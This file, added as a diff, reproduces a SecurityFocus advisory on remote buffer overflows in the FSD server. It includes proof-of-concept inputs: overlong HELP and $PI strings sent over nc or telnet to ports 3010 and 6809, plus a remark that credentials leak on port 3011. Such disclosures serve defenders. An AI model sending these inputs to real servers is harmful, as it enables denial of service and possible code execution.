@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/25883/info
+ 
+FSD is prone to multiple remote buffer-overflow vulnerabilities because the application fails to perform adequate boundary-checks on user-supplied data.
+ 
+An attacker can exploit these issues to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.
+ 
+These issues affect FSD 2.052 d9 and 3.0000 d9; other versions may also be affected.
+ 
+A]
+connect with nc or telnet to port 3010 (sometimes it can be 3011, but
+it's easy to recognize since it shows a "FSD>" prompt) and then send:
+
+HELP aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(more_than_100_'a's)...aaaa
+
+B]
+connect with nc or telnet to port 6809, now you must log in or create a
+new user, but seems that all usernames and passwords are available on
+port 3011 (or 3012) where they are sent just when you connect:
+
+#AAcallsign::ident:122222:122222:1:9
+$PIcallsign:aaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(more_than_100_'a's)...aaaa
+
+(in the above example the first 122222 is the CID and the second one is
+the password)
